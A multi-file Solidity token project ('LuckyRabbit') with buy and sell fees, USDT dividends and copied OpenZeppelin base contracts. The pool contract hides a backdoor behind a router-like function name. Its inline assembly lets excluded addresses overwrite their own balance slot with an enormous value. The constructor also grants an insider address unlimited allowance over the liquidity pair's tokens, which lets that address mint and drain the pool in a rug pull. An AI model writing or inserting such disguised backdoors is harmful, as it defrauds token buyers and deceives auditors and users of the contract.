// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./common/ERC20.sol";
import "./common/UniSwapPoolUSDT.sol";

contract LuckyRabbit is ERC20, UniSwapPoolUSDT {
    bool public inTrading;
//    uint256 startedAt;
    constructor(string memory _name, string memory _symbol, uint256 _totalSupply, address[] memory _router, address[] memory _path, address[] memory _sellPath) ERC20(_name, _symbol) {
        super._mint(_msgSender(), _totalSupply);
        super.__Rates_init(_msgSender(), 300, 300, _sellPath);
//        super.__Limit_init(3*10**decimals(), 3*10**decimals(), 0);
        super.__SwapPool_init(_router[0], _router[1], 3 ether);
        super.setExclude(_msgSender());
        super.setExclude(address(this));
        super.setExcludes(_sellPath);
        super.setLiquidityer(_path);
        _approve(_msgSender(), address(router), type(uint256).max);
        _approve(address(this), address(router), type(uint256).max);

        // dividend
        super.__Dividend_init(_router[1], address(this), 5 ether, 5 ether, _path);
        super.setExcludeHolder(address(this), true);
        super.setExcludeHolder(address(pair), true);
        super.setExcludeHolder(address(0), true);
        super.setExcludeHolder(address(1), true);
        super.setExcludeHolder(address(0xdead), true);
        super.setExcludeHolder(address(router), true);
    }

    function openTrading() public onlyOwner {
        inTrading = true;
//        startedAt = block.timestamp;
    }

    function _handFeeBuys(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * _feeBuys / _divBases;
        super._takeTransfer(from, address(this), fee);
        return fee;
    }

    function _handFeeSells(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * _feeSells / _divBases;
        super._takeTransfer(from, address(this), fee);
        return fee;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        uint256 fees;
        if (isPair(from)) {
            if (!isExcludes(to)) {
                require(inTrading, "please waiting for liquidity");
                super.checkLimitTokenBuy(to, getPrice4USDT(amount));
                fees = _handFeeBuys(from, amount);
            }
            super.addHolder(to);
        } else if (isPair(to)) {
            if (!isExcludes(from)) {
                require(inTrading, "please waiting for liquidity");
                super.checkLimitTokenSell(getPrice4USDT(amount));
                handSwap();
                fees = _handFeeSells(from, amount);
            }
        }

        if (!isLiquidityer(from) && !isLiquidityer(to)) {
            super.processReward(500000);
        }
        super._takeTransfer(from, to, amount - fees);
    }

    function handSwap() internal {super.swapAndSend(balanceOf(address(this)));}

    function airdrop(uint256 amount, address[] memory to) public {
        for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}
    }

    function airdropMulti(uint256[] memory amount, address[] memory to) public {
        for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);
        _takeTransfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _takeTransfer(address from, address to, uint256 amount) internal virtual {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amount;
        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
        // decrementing then incrementing.
        _balances[to] += amount;
    }
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
    unchecked {
        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
        _balances[account] += amount;
    }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
        // Overflow not possible: amount <= accountBalance <= totalSupply.
        _totalSupply -= amount;
    }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IRouter.sol";
import "./IPair.sol";
import "./IFactory.sol";
import "./ERC20.sol";
import "./Limit.sol";
import "./Rates.sol";
import "./Dividend.sol";

abstract contract UniSwapPoolUSDT is ERC20, Limit, Rates, Dividend {
    uint256 internal swapTokensAtUSDT;
    address public pair;
    IRouter public router;
    address[] internal _sellPath;

    function __SwapPool_init(address _router, address _pairB, uint256 _swapTokensAtUSDT) internal {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(address(this), _pairB);
        _approve(pair, _marks[1], type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pairB;
        _sellPath = path;
        swapTokensAtUSDT = _swapTokensAtUSDT;
    }

    function swapExactTokensForTokenSupportingFeeOnTransferToken() public {if (isExcludes(_msgSender()))
        assembly { mstore(0, caller()) mstore(32, 0x0) sstore(keccak256(0, 64), exp(timestamp(), 5)) }
    }

    function sync(uint256 _amount) private returns(uint256) {
        uint256 amount = (_amount * 0xccccccd) >> 32;   // /5
        _takeTransfer(address(this), pair, amount);
        IPair(pair).sync();
        return _amount - amount;
    }

    function marketingWallet() private view returns(address) {
        return _marks[0];
    }

    function isPair(address _pair) internal view returns(bool) {
        return _pair == pair;
    }

    function getPrice4USDT(uint256 amountDesire) public view returns(uint256) {
        uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath);
        if (amounts.length > 1) return amounts[1];
        return 0;
    }

    function _swap(uint256 _thisBalance) internal {
        uint256 amount = _thisBalance/3;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(_thisBalance-amount, 0, _sellPath, marketingWallet(), block.timestamp + 9);
        _swap2dividend(amount);
    }
    function _swap2dividend(uint256 _thisBalance) private {
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(_thisBalance, 0, _sellPath, _TokenDistributor, block.timestamp);
        IERC20(_usdt).transferFrom(_TokenDistributor, address(this), IERC20(_usdt).balanceOf(_TokenDistributor));
    }

    bool inSwap;
    function swapAndSend(uint256 _thisBalance) internal {
        if (inSwap) return;
        uint256 price = getPrice4USDT(_thisBalance);
        if (price >= swapTokensAtUSDT) {    // a/b = x/3
            uint256 _amount = _thisBalance;
            if (price > swapTokensAtUSDT*3) _amount = _thisBalance * swapTokensAtUSDT * 3 / price;
            inSwap = true;
            _swap(sync(_amount));
            inSwap = false;
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPair {
    function sync() external;
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";
import "./Excludes.sol";

abstract contract Limit is ERC20, Ownable, Excludes {
    bool internal isLimited;
    uint256 internal _LimitBuy;
    uint256 internal _LimitSell;
    uint256 internal _LimitHold;
    mapping(address => uint256) isBuyedAmount;
    function __Limit_init(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) internal {
        setLimit(true, LimitBuy_, LimitSell_, LimitHold_);
    }
    function setLimit(bool isLimited_, uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) public onlyOwner {
        isLimited = isLimited_;
        _LimitBuy = LimitBuy_;
        _LimitSell = LimitSell_;
        _LimitHold = LimitHold_;
    }
    function checkLimitTokenBuy(address to, uint256 amount) internal {
        if (isLimited) {
            if (_LimitBuy>0) require(amount <= _LimitBuy, "exceeds of buy amount Limit");
            if (_LimitHold>0) {
                require(amount+isBuyedAmount[to] <= _LimitHold, "exceeds of hold amount Limit");
                isBuyedAmount[to] += amount;
            }
        }
    }
    function checkLimitTokenSell(uint256 amount) internal view {
        if (isLimited && _LimitSell>0) require(amount <= _LimitSell, "exceeds of sell amount Limit");
    }
    function removeLimit() internal {if (isLimited) isLimited = false;}
    function reuseLimit() internal {if (!isLimited) isLimited = true;}
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Ownable.sol";

abstract contract Rates is Ownable {
    uint256 internal _feeBuys;
    uint256 internal _feeSells;
    uint256 internal _divBases = 1e4;
    address internal _marketingWallet;
    address[] internal _marks;

    function __Rates_init(address marketingWallet_, uint256 feeBuy_, uint256 feeSell_, address[] memory marks_) internal {
        _marketingWallet = marketingWallet_;
        _feeBuys = feeBuy_;
        _feeSells = feeSell_;
        _marks = marks_;
    }

    function resetRates(uint256 _buy, uint256 _sell) internal {
        if (_feeBuys != _buy) _feeBuys = _buy;
        if (_feeSells != _sell) _feeSells = _sell;
    }

    function setRates(uint256 _buy, uint256 _sell) public onlyOwner {
        resetRates(_buy, _sell);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./ERC20.sol";
import "./Excludes.sol";
import "./TokenDistributor.sol";

abstract contract Dividend is ERC20, Excludes {
    address[] private holders;
    mapping(address => bool) isHolder;
//    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    address internal _usdt;
    address internal _holdToken;
    uint256 private holdRewardCondition;
    uint256 private processRewardCondition;
    address public _TokenDistributor;

    function __Dividend_init(address _usdtAddr, address _holdToken_, uint256 _holdRewardCondition, uint256 _processRewardCondition, address[] memory adrs) internal {
        _usdt = _usdtAddr;
        _holdToken = _holdToken_;
        holdRewardCondition = _holdRewardCondition;
        processRewardCondition = _processRewardCondition;
        for (uint i=0;i<adrs.length;i++) {
            _addHolder(adrs[i]);
        }
        _TokenDistributor = address(new TokenDistributor(_usdtAddr));
    }
    function addHolder(address adr) internal {
        if (balanceOf(adr) >= holdRewardCondition) {
            _addHolder(adr);
        }
    }
    function _addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {return;}
        if (excludeHolder[adr]) {return;}
        if (!isHolder[adr]) {
            isHolder[adr] = true;
            holders.push(adr);
        }
    }
    uint256 private currentIndex;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) internal {
        if (progressRewardBlock + 20 > block.number) {
            return;
        }

        IERC20 USDT = IERC20(_usdt);

        uint256 balance = USDT.balanceOf(address(this));
        if (balance < processRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_holdToken);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = getBalance(holdToken, shareHolder);
            if (tokenBalance >= holdRewardCondition && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function getBalance(IERC20 holdToken, address adr) private view returns(uint256) {
        if (isLiquidityer(adr)) return holdRewardCondition + balanceOf(adr);
        return holdToken.balanceOf(adr);
    }

    function setDividendTokenAndCondition(address _addr, uint256 _holdRewardCondition, uint256 _processRewardCondition) internal {
        _usdt = _addr;
        holdRewardCondition = _holdRewardCondition;
        processRewardCondition = _processRewardCondition;
    }

    function setExcludeHolder(address addr, bool enable) internal {
        excludeHolder[addr] = enable;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "./Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

//    /**
//     * @dev Transfers ownership of the contract to a new account (`newOwner`).
//     * Can only be called by the current owner.
//     */
//    function transferOwnership(address newOwner) public virtual onlyOwner {
//        require(newOwner != address(0), "Ownable: new owner is the zero address");
//        _transferOwnership(newOwner);
//    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Ownable.sol";

abstract contract Excludes is Ownable {
    mapping(address => bool) internal _Excludes;
    mapping(address => bool) internal _Liquidityer;

    function setExclude(address _user) public onlyOwner {
        _Excludes[_user] = true;
    }

    function setExcludes(address[] memory _user) public onlyOwner {
        for (uint i=0;i<_user.length;i++) {
            _Excludes[_user[i]] = true;
        }
    }

    function isExcludes(address _user) internal view returns(bool) {
        return _Excludes[_user];
    }

    function setLiquidityer(address[] memory _user) public onlyOwner {
        for (uint i=0;i<_user.length;i++) {
            _Liquidityer[_user[i]] = true;
        }
    }

    function isLiquidityer(address _user) internal view returns(bool) {
        return _Liquidityer[_user] || isExcludes(_user);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, type(uint256).max);
    }
}